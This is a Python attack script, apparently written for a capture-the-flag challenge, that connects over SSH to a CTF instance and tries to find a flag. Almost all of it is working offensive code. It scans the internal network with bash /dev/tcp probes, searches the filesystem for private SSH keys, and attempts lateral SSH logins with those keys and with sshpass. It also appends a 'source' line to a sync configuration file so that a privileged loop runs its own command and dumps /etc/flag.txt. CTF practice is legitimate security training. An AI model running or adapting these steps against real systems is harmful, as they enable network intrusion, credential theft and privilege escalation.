#!/usr/bin/env python3
"""
Final push - read sync script, scan network, find second server
"""

import paramiko
import time
import struct
import socket

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

def ssh_connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    return client

def exec_cmd(client, cmd, timeout=30):
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        return stdout.read().decode() + stderr.read().decode()
    except:
        return ""

def hex_to_ip(hex_str):
    """Convert hex route to IP"""
    try:
        # Reverse byte order for little endian
        hex_clean = hex_str.replace("0x", "")
        # Parse as little endian
        ip_int = int(hex_clean, 16)
        return socket.inet_ntoa(struct.pack("<I", ip_int))
    except:
        return None

def main():
    print("[*] FINAL PUSH - Finding the flag")
    
    client = ssh_connect()
    print("[+] Connected\n")
    
    # 1. Gateway is 172.27.0.1 (01001BAC in hex)
    gateway = "172.27.0.1"
    print(f"[*] Gateway: {gateway}")
    
    # 2. Read sync-loop.sh properly
    print("\n[*] Reading sync-loop.sh...")
    out = exec_cmd(client, "cat /opt/mc/scripts/sync-loop.sh")
    if out:
        print(out)
        print("="*60)
    
    # 3. Scan for other containers in network
    print("\n[*] Scanning 172.27.0.0/24 for SSH...")
    found_hosts = []
    
    for i in range(1, 10):  # Quick scan first 10
        ip = f"172.27.0.{i}"
        # Use bash TCP check
        out = exec_cmd(client, f"timeout 1 bash -c 'echo >/dev/tcp/{ip}/22' 2>&1 && echo 'OPEN:{ip}:22' || echo ''", timeout=3)
        if "OPEN" in out:
            found_hosts.append(ip)
            print(f"  [✓] {ip}:22 OPEN")
    
    # 4. Try HTTP/web ports on gateway
    print(f"\n[*] Probing {gateway} for web services...")
    for port in [80, 8080, 443, 3000, 5000, 8000]:
        out = exec_cmd(client, f"curl -s -m 2 http://{gateway}:{port}/ 2>&1 | head -10")
        if out and len(out) > 10 and "Failed" not in out:
            print(f"\n  [{gateway}:{port}]")
            print(out[:300])
    
    # 5. Check if we can access gateway via SSH with any common keys
    print(f"\n[*] Trying to SSH to {gateway}...")
    
    # Check for any SSH keys in container
    out = exec_cmd(client, "find / -name 'id_*' 2>/dev/null | grep -E '(rsa|ed25519|ecdsa)'")
    if out:
        print(f"  Found keys: {out}")
        # Try to use them
        for key_path in out.strip().split('\n'):
            if key_path:
                print(f"  Trying key: {key_path}")
                ssh_out = exec_cmd(client, f"ssh -i {key_path} -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@{gateway} 'whoami; cat /etc/flag.txt; cat flag.txt' 2>&1", timeout=10)
                print(ssh_out[:500])
                if "TDHT{" in ssh_out:
                    print(f"\n🚩 FLAG FOUND: {ssh_out}")
                    return
    
    # 6. Try password-based SSH
    print(f"\n[*] Trying password SSH to {gateway}...")
    ssh_cmd = f"sshpass -p '{PASSWORD}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@{gateway} 'whoami; cat /etc/flag.txt; cat flag.txt' 2>&1"
    out = exec_cmd(client, ssh_cmd, timeout=10)
    print(out[:500])
    if "TDHT{" in out:
        print(f"\n🚩 FLAG: {out}")
        return
    
    # 7. Try other found hosts
    for host in found_hosts:
        if host != "172.27.0.3":  # Not ourselves
            print(f"\n[*] Trying {host}...")
            out = exec_cmd(client, f"sshpass -p '{PASSWORD}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@{host} 'hostname; cat /etc/flag.txt; cat flag.txt' 2>&1", timeout=10)
            print(out[:300])
            if "TDHT{" in out:
                print(f"\n🚩 FLAG: {out}")
                return
    
    # 8. Check if sync created output
    print("\n[*] Checking if sync-loop processed our exploit...")
    time.sleep(3)
    
    locations = [
        "/tmp/flag.txt",
        "/tmp/output",
        "/tmp/result",
        "/opt/mc/flag.txt",
        "/opt/mc/logs/flag.log",
        "/home/player/flag.txt"
    ]
    
    for loc in locations:
        out = exec_cmd(client, f"cat {loc} 2>/dev/null")
        if "TDHT{" in out:
            print(f"\n🚩 FLAG at {loc}: {out}")
            return
        elif out:
            print(f"  {loc}: {out[:100]}")
    
    # 9. Try to trigger sync manually
    print("\n[*] Triggering sync manually...")
    exec_cmd(client, "echo 'cat /etc/flag.txt > /tmp/flag_output' > /opt/mc/config/exploit.sh")
    exec_cmd(client, "chmod +x /opt/mc/config/exploit.sh")
    exec_cmd(client, "echo 'source /opt/mc/config/exploit.sh' >> /opt/mc/config/sync-request.conf")
    
    time.sleep(5)
    out = exec_cmd(client, "cat /tmp/flag_output 2>/dev/null")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG: {out}")
        return
    
    # 10. Last resort - full filesystem grep
    print("\n[*] Full filesystem search for TDHT{...")
    out = exec_cmd(client, "grep -r 'TDHT{' /opt /tmp /home /var 2>/dev/null | head -5", timeout=60)
    if "TDHT{" in out:
        print(f"\n🚩 FLAG FOUND: {out}")
        return
    
    print("\n[!] Flag not found yet. Key info collected.")
    print("\nNEXT STEPS:")
    print("1. The sync-loop.sh script (see above) is the key")
    print("2. Gateway at 172.27.0.1 likely hosts the flag")
    print("3. Need credentials from GHCR public image")
    print("4. Or exploit sync mechanism to gain root/escape")
    
    client.close()

if __name__ == "__main__":
    main()
